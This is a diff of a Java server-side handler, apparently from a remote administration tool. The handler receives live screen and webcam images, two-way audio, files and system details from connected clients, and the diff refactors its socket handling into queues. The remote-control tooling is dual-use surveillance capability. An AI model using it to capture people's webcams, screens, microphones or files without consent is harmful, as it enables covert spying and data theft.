@@ -3,7 +3,6 @@ package br.com.introcdc.connect.server.connection;
  * Written by IntroCDC, Bruno Coêlho at 15/01/2025 - 18:10
  */
 
-import br.com.introcdc.connect.Connect;
 import br.com.introcdc.connect.server.ConnectServer;
 import br.com.introcdc.connect.server.components.ServerAudioComponents;
 import br.com.introcdc.connect.server.components.ServerControlComponents;
@@ -28,6 +27,8 @@ import java.net.ServerSocket;
 import java.net.Socket;
 import java.util.ArrayList;
 import java.util.List;
+import java.util.concurrent.BlockingQueue;
+import java.util.concurrent.LinkedBlockingQueue;
 import java.util.concurrent.TimeUnit;
 import java.util.regex.Matcher;
 
@@ -65,6 +66,15 @@ public class ClientHandler implements Runnable {
 
     private BufferedImage screenImage;
     private BufferedImage webcamImage;
+
+    public BlockingQueue<java.net.Socket> iconWebcamSockets = new LinkedBlockingQueue<>();
+    public BlockingQueue<java.net.Socket> iconScreenSockets = new LinkedBlockingQueue<>();
+    public BlockingQueue<java.net.Socket> webcamSockets = new LinkedBlockingQueue<>();
+    public BlockingQueue<java.net.Socket> screenSockets = new LinkedBlockingQueue<>();
+    public BlockingQueue<java.net.Socket> viewSockets = new LinkedBlockingQueue<>();
+    public BlockingQueue<java.net.Socket> audioUserSockets = new LinkedBlockingQueue<>();
+    public BlockingQueue<java.net.Socket> audioServerSockets = new LinkedBlockingQueue<>();
+    public BlockingQueue<Socket> receiveFileSockets = new LinkedBlockingQueue<>();
 
     public JFrame CHAT_FRAME;
     public JTextArea CHAT_TEXT;
@@ -127,6 +137,7 @@ public class ClientHandler implements Runnable {
                     String info = command.replace("connect:", "");
                     String[] args = info.split("\\|");
                     if (args.length != 4) {
+                        System.out.println("DEBUG COMANDO INCORRETO: '" + command + "', args.length: " + args.length);
                         closeConnection("Conexão com o cliente " + getClientIP() + " não identificada! (" + this.location + ")");
                         ServerAudioComponents.generateBeep(100, 250, true);
                         break;
@@ -159,8 +170,8 @@ public class ClientHandler implements Runnable {
                     new Thread(() -> {
                         boolean first = true;
                         JLabel label = null;
-                        try (ServerSocket serverSocket = new ServerSocket(Connect.PORT + (webcam ? 10 : 9))) {
-                            try (Socket clientSocket = serverSocket.accept();
+                        try {
+                            try (Socket clientSocket = (webcam ? iconWebcamSockets : iconScreenSockets).take();
                                  InputStream is = clientSocket.getInputStream()) {
                                 BufferedImage receivedImage = ImageIO.read(is);
                                 new Thread(() -> {
@@ -214,27 +225,18 @@ public class ClientHandler implements Runnable {
                     ConnectServer.msg(getClientInfo() + ": Recebendo " + (cmd.contains("-live") ? "transmissão de " : "") +
                             (view ? "visualização de imagem" : webcam ? "webcam" : "tela") + " do cliente...");
                     if (!view) {
-                        if (webcam && webcamSocket != null) {
+                        if (webcam) {
                             webcamLive = cmd.contains("-live");
-                            webcamSocket.close();
-                        } else if (!webcam && screenSocket != null) {
+                        } else if (!webcam) {
                             screenLive = cmd.contains("-live");
-                            screenSocket.close();
                         }
                     }
                     new Thread(() -> {
                         boolean first = true;
                         JLabel label = null;
-                        try (ServerSocket serverSocket = new ServerSocket(Connect.PORT + (view ? 5 : webcam ? 2 : 1))) {
-                            if (view) {
-                                viewSocket = serverSocket;
-                            } else if (webcam) {
-                                webcamSocket = serverSocket;
-                            } else {
-                                screenSocket = serverSocket;
-                            }
-                            while (((webcam && webcamLive) || (!webcam && screenLive)) || first) {
-                                try (Socket clientSocket = serverSocket.accept();
+                        try {
+                            while ((!view && ((webcam && webcamLive) || (!webcam && screenLive))) || first) {
+                                try (Socket clientSocket = view ? viewSockets.take() : (webcam ? webcamSockets.take() : screenSockets.take());
                                      InputStream is = clientSocket.getInputStream()) {
 
                                     if (cmd.contains("-live")) {
@@ -281,15 +283,19 @@ public class ClientHandler implements Runnable {
                                     } else {
                                         first = false;
                                         BufferedImage receivedImage = ImageIO.read(is);
-                                        new Thread(() -> {
-                                            try (ByteArrayOutputStream bos = new ByteArrayOutputStream()) {
-                                                ImageIO.write(receivedImage, "jpg", bos);
-                                                ConnectServer.addBytes(bos.toByteArray().length, false);
-                                            } catch (Exception ignored) {
-                                            }
-                                        }).start();
-                                        ServerImageComponents.openImage(receivedImage, getClientInfo() + " (" +
-                                                (view ? "Visualização de Imagem" : webcam ? "Webcam" : "Screen") + ")");
+                                        if (receivedImage != null) {
+                                            new Thread(() -> {
+                                                try (ByteArrayOutputStream bos = new ByteArrayOutputStream()) {
+                                                    ImageIO.write(receivedImage, "jpg", bos);
+                                                    ConnectServer.addBytes(bos.toByteArray().length, false);
+                                                } catch (Exception ignored) {
+                                                }
+                                            }).start();
+                                            ServerImageComponents.openImage(receivedImage, getClientInfo() + " (" +
+                                                    (view ? "Visualização de Imagem" : webcam ? "Webcam" : "Screen") + ")");
+                                        } else {
+                                            ConnectServer.msg(getClientInfo() + ": Imagem recebida inválida ou corrompida.");
+                                        }
                                     }
                                 }
                             }
@@ -309,12 +315,6 @@ public class ClientHandler implements Runnable {
                             SourceDataLine speakers = null;
                             TargetDataLine microphone = null;
                             if (fromUser) {
-                                try {
-                                    if (audioUserSocket != null) {
-                                        audioUserSocket.close();
-                                    }
-                                } catch (Exception ignored) {
-                                }
                                 speakers = getSourceDataLine();
                                 if (speakers == null) {
                                     ConnectServer.msg("Alto-falante do servidor não encontrado!");
@@ -322,12 +322,6 @@ public class ClientHandler implements Runnable {
                                 }
                                 ServerAudioComponents.AUDIO_USER = true;
                             } else {
-                                try {
-                                    if (audioServerSocket != null) {
-                                        audioServerSocket.close();
-                                    }
-                                } catch (Exception ignored) {
-                                }
                                 microphone = getTargetDataLine();
                                 if (microphone == null) {
                                     ConnectServer.msg("Microfone do servidor não encontrado!");
@@ -340,15 +334,9 @@ public class ClientHandler implements Runnable {
                             TargetDataLine microphoneInfo = microphone;
 
                             new Thread(() -> {
-                                try (ServerSocket serverSocket = new ServerSocket(Connect.PORT + (fromUser ? 7 : 8))) {
-                                    Socket clientSocket = serverSocket.accept();
+                                try {
+                                    Socket clientSocket = fromUser ? audioUserSockets.take() : audioServerSockets.take();
                                     ConnectServer.msg(getClientInfo() + ": Transmissão de áudio estabelecida, executando...");
-
-                                    if (fromUser) {
-                                        audioUserSocket = serverSocket;
-                                    } else {
-                                        audioServerSocket = serverSocket;
-                                    }
 
                                     try {
                                         if (fromUser) {
@@ -373,10 +361,7 @@ public class ClientHandler implements Runnable {
                                             } finally {
                                                 speakersInfo.close();
                                                 clientSocket.close();
-                                                try {
-                                                    serverSocket.close();
-                                                } catch (Exception ignored) {
-                                                }
+                                                // removed
                                                 ConnectServer.msg(getClientInfo() + ": Transmissão de áudio do cliente para o servidor finalizada");
                                                 if (ServerGUI.AUDIO_USER != null) {
                                                     ServerGUI.AUDIO_USER.setBackground(Color.RED);
@@ -405,10 +390,7 @@ public class ClientHandler implements Runnable {
                                                 microphoneInfo.close();
                                                 clientSocket.close();
                                                 ConnectServer.msg(getClientInfo() + ": Transmissão de áudio do servidor para o cliente finalizada");
-                                                try {
-                                                    serverSocket.close();
-                                                } catch (Exception ignored) {
-                                                }
+                                                // removed
                                                 if (ServerGUI.AUDIO_SERVER != null) {
                                                     ServerGUI.AUDIO_SERVER.setBackground(Color.RED);
                                                 }
@@ -416,89 +398,16 @@ public class ClientHandler implements Runnable {
                                         }
                                     } catch (Exception exception) {
                                         ConnectServer.msg(getClientInfo() + ": Ocorreu um erro na execução do servidor de áudio por parte do servidor " + (fromUser ? "do cliente para o servidor" : "do servidor para o cliente") + " (" + exception.getMessage() + ")");
-                                        if (fromUser) {
-                                            try {
-                                                if (audioUserSocket != null) {
-                                                    audioUserSocket.close();
-                                                }
-                                            } catch (Exception ignored) {
-                                            }
-                                            try {
-                                                speakersInfo.close();
-                                            } catch (Exception ignored) {
-                                            }
-                                            if (ServerGUI.AUDIO_USER != null) {
-                                                ServerGUI.AUDIO_USER.setBackground(Color.RED);
-                                            }
-                                        } else {
-                                            try {
-                                                if (audioServerSocket != null) {
-                                                    audioServerSocket.close();
-                                                }
-                                            } catch (Exception ignored) {
-                                            }
-                                            try {
-                                                microphoneInfo.close();
-                                            } catch (Exception ignored) {
-                                            }
-                                            if (ServerGUI.AUDIO_SERVER != null) {
-                                                ServerGUI.AUDIO_SERVER.setBackground(Color.RED);
-                                            }
-                                        }
                                     }
                                 } catch (Exception exception) {
                                     if (exception.getMessage().equalsIgnoreCase("Socket closed")) {
                                         return;
                                     }
                                     ConnectServer.msg(getClientInfo() + ": Ocorreu um erro na execução do servidor de áudio por parte do servidor " + (fromUser ? "do cliente para o servidor" : "do servidor para o cliente") + " (" + exception.getMessage() + ")");
-                                    if (fromUser) {
-                                        try {
-                                            if (audioUserSocket != null) {
-                                                audioUserSocket.close();
-                                            }
-                                        } catch (Exception ignored) {
-                                        }
-                                        try {
-                                            speakersInfo.close();
-                                        } catch (Exception ignored) {
-                                        }
-                                        if (ServerGUI.AUDIO_USER != null) {
-                                            ServerGUI.AUDIO_USER.setBackground(Color.RED);
-                                        }
-                                    } else {
-                                        try {
-                                            if (audioServerSocket != null) {
-                                                audioServerSocket.close();
-                                            }
-                                        } catch (Exception ignored) {
-                                        }
-                                        try {
-                                            microphoneInfo.close();
-                                        } catch (Exception ignored) {
-                                        }
-                                        if (ServerGUI.AUDIO_SERVER != null) {
-                                            ServerGUI.AUDIO_SERVER.setBackground(Color.RED);
-                                        }
-                                    }
                                 }
                             }).start();
                         } catch (Exception exception) {
                             ConnectServer.msg("Ocorreu um erro ao processar o servidor de áudio por parte do servidor! (" + exception.getMessage() + ")");
-                            if (fromUser) {
-                                try {
-                                    if (audioUserSocket != null) {
-                                        audioUserSocket.close();
-                                    }
-                                } catch (Exception ignored) {
-                                }
-                            } else {
-                                try {
-                                    if (audioServerSocket != null) {
-                                        audioServerSocket.close();
-                                    }
-                                } catch (Exception ignored) {
-                                }
-                            }
                         }
                     }).start();
                 } else if (command.startsWith("stoplivewebcam")) {
@@ -537,10 +446,9 @@ public class ClientHandler implements Runnable {
                     }
                 } else if (command.equalsIgnoreCase("receive-file")) {
                     ConnectServer.msg(getClientInfo() + ": Recebendo arquivo do cliente...");
-                    ConnectServer.EXECUTOR.schedule(() -> new Thread(() -> {
-                        try (ServerSocket serverSocket = new ServerSocket(Connect.PORT + 3)) {
-                            fileSocket = serverSocket;
-                            try (Socket clientSocket = serverSocket.accept();
+                    ConnectServer.EXECUTOR.schedule(ConnectServer.runnable(() -> new Thread(() -> {
+                        try {
+                            try (Socket clientSocket = receiveFileSockets.take();
                                  DataInputStream dis = new DataInputStream(clientSocket.getInputStream());
                                  BufferedOutputStream bos = new BufferedOutputStream(new FileOutputStream("connect/" + dis.readUTF()))) {
 
@@ -558,7 +466,7 @@ public class ClientHandler implements Runnable {
                         } catch (Exception exception) {
                             ConnectServer.msg(getClientInfo() + ": Ocorreu um erro ao receber um arquivo do cliente");
                         }
-                    }).start(), 100, TimeUnit.MILLISECONDS);
+                    }).start()), 100, TimeUnit.MILLISECONDS);
                 } else {
                     ConnectServer.msg(getClientInfo() + ": " + command);
                     if (command.contains("Interfaces USB:") || command.contains("Separador de Linha:")) {
@@ -630,42 +538,7 @@ public class ClientHandler implements Runnable {
         ServerAudioComponents.AUDIO_SERVER = false;
         ServerAudioComponents.AUDIO_USER = false;
 
-        if (viewSocket != null) {
-            try {
-                viewSocket.close();
-            } catch (Exception ignored) {
-            }
-        }
-        if (webcamSocket != null) {
-            try {
-                webcamSocket.close();
-            } catch (Exception ignored) {
-            }
-        }
-        if (screenSocket != null) {
-            try {
-                screenSocket.close();
-            } catch (Exception ignored) {
-            }
-        }
-        if (fileSocket != null) {
-            try {
-                fileSocket.close();
-            } catch (Exception ignored) {
-            }
-        }
-        if (audioServerSocket != null) {
-            try {
-                audioServerSocket.close();
-            } catch (Exception ignored) {
-            }
-        }
-        if (audioUserSocket != null) {
-            try {
-                audioUserSocket.close();
-            } catch (Exception ignored) {
-            }
-        }
+        // Removed socket closes
         if (clientSocket != null) {
             try {
                 clientSocket.close();
